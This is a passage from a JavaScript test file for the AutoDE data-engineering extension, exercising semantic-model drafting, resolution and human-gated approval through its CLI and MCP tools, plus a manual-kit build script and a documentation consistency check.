      const draft = await call('autode_semantic_draft', { name: 'sales', database: 'RETAIL' });
      assert.ok(/name: sales[\s\S]*base_table:[\s\S]*table: orders/.test(draft.yaml) && /autode_propose_semantic_model/.test(draft.next), JSON.stringify(draft).slice(0, 300));
      const prop = await call('autode_propose_semantic_model', { semanticModel: { scope: 'shared', name: 'sales', content: draft.yaml } });
      assert.strictEqual(prop.decision.stakes, 'high');
      await client.close(); client = undefined;
      const W = ['--workspace', ws];
      // The CLI: a draft never overwrites; compose, resolve, check; approving is a person's.
      const d = await cli(['semantic', 'draft', 'sales', '--database', 'RETAIL', ...W]);
      assert.strictEqual(d.code, 0, d.out + d.err);
      assert.strictEqual((await cli(['semantic', 'draft', 'sales', ...W])).code, 1, 'never overwrites');
      const pid = JSON.parse(nodeFs.readFileSync(nodePath.join(ws, '.autode', 'local', 'active-problem.json'), 'utf8')).problemId;
      assert.strictEqual((await cli(['semantic', 'compose', 'daily_tax', '--models', 'sales', ...W])).code, 0);
      const res = await cli(['semantic', 'resolve', 'daily_tax', ...W]);
      assert.ok(res.code === 0 && /daily_tax\.resolved\.yaml written \(sales@[0-9a-f]{12}\)/.test(res.out), res.out + res.err);
      assert.strictEqual((await cli(['semantic', 'check', 'sales', ...W])).code, 0);
      assert.strictEqual((await cli(['semantic', 'approve', 'sales', ...W])).code, 4, 'a person at a terminal');
      const ap = await cli(['semantic', 'approve', 'sales', ...W], { interactive: true, answers: ['approve'] });
      assert.ok(ap.code === 0 && /sales approved by/.test(ap.out), ap.out + ap.err);
      const show = await cli(['semantic', 'show', ...W]);
      assert.ok(/sales\s+approved/.test(show.out) && /daily_tax\s+resolved/.test(show.out), show.out);
      // MCP reads what the CLI wrote.
      client = await mcpSession(ws);
      const c2 = async (name, args = {}) => (await client.callTool({ name, arguments: args })).structuredContent;
      const list = await c2('autode_semantic_list');
      assert.deepStrictEqual([list.shared.map((s) => [s.name, s.status]), list.composites.map((c) => [c.name, c.status, c.problemId === pid])], [[['sales', 'approved']], [['daily_tax', 'resolved', true]]]);
      assert.deepStrictEqual((await c2('autode_semantic_check', { name: 'sales' })).errors, []);
      assert.ok((await c2('autode_semantic_resolve', { name: 'daily_tax' })).changed === false);
      const uris = (await client.listResources()).resources.map((r) => r.uri);
      for (const u of ['autode://semantic/shared/sales', 'autode://semantic/composite/daily_tax', 'autode://semantic/resolved/daily_tax']) assert.ok(uris.includes(u), u);
      assert.match((await client.readResource({ uri: 'autode://semantic/resolved/daily_tax' })).contents[0].text, /^# Resolved by AutoDE/);
      // The extension registers the editor for semantic folders and the commands.
      const pkg = require('../package.json');
      const ed = pkg.contributes.customEditors.find((e) => e.viewType === 'autoDE.semanticModelEditor');
      assert.deepStrictEqual([ed.selector[0].filenamePattern, ed.priority], ['**/semantic/*.yaml', 'default']);
      const cmds = pkg.contributes.commands.map((c) => c.command);
      assert.ok(cmds.includes('autoDataEngineeringHub.newSemanticModel') && cmds.includes('autoDataEngineeringHub.newSemanticComposite') && !cmds.includes('autoDataEngineeringHub.buildSemanticLayer'));
      const html = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'media', 'editors', 'semanticModelEditor.html'), 'utf8');
      assert.ok(!/\son[a-z]+=/i.test(html), 'no inline handlers (the webview CSP allows only its nonce\'d script)');
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('manual kit: builds the workspace (sources, pack documents, connection template, Claude plugin with its guard hook), pre-runs every person-free step and writes MANUAL-KIT.md; refuses to replace a folder that is not its own', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs');
    const out = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-kit-test-'));
    try {
      const run = (args) => require('node:child_process').spawnSync(process.execPath, [nodePath.join(__dirname, '..', 'scripts', 'manual-kit.cjs'), ...args], { encoding: 'utf8', timeout: 240000 });
      nodeFs.writeFileSync(nodePath.join(out, 'mine.txt'), 'not a kit');
      const refused = run(['--out', out]);
      assert.ok(refused.status === 2 && /not a kit folder/.test(refused.stderr) && nodeFs.existsSync(nodePath.join(out, 'mine.txt')), refused.stderr);
      nodeFs.rmSync(out, { recursive: true, force: true });
      const r = run(['--out', out]);
      assert.strictEqual(r.status, 0, r.stdout + r.stderr);
      for (const f of ['sources/shop.ddl', 'documents/brd.md', 'documents/customer-contract.v1.yaml', '.autode/config/connections.example.yaml', '.claude/settings.json', '.mcp.json', 'MANUAL-KIT.md']) assert.ok(nodeFs.existsSync(nodePath.join(out, f)), f);
      const md = nodeFs.readFileSync(nodePath.join(out, 'MANUAL-KIT.md'), 'utf8');
      assert.ok(!/\*\*FAIL\*\*/.test(md) && /\| 36\.6 \|[^\n]*\| PASS \|/.test(md) && /\| 39\.5 \|/.test(md), md.slice(0, 1500));
      assert.ok(!nodeFs.existsSync(nodePath.join(out, '.autode', 'problems')), 'the pre-checks ran in a throwaway copy');
      assert.strictEqual(run(['--out', out]).status, 2, 'an existing kit folder needs --force');
    } finally { nodeFs.rmSync(out, { recursive: true, force: true }); }
  });

  await test('docs: the generated sections of technical-design.md (settings, source tree) match package.json and src/', () => {
    const { spawnSync } = require('node:child_process');
    const nodePath = require('node:path');
    const r = spawnSync(process.execPath, [nodePath.join(__dirname, '..', 'scripts', 'docs-generate.cjs'), '--check'], { encoding: 'utf8' });
    assert.strictEqual(r.status, 0, (r.stderr || r.stdout).trim());
  });

  const failed = results.filter(r => !r.ok);
  console.log(`\n${results.length - failed.length}/${results.length} passed`);
  process.exit(failed.length ? 1 : 0);
}

main().catch(e => { console.error('Fatal:', e); process.exit(1); });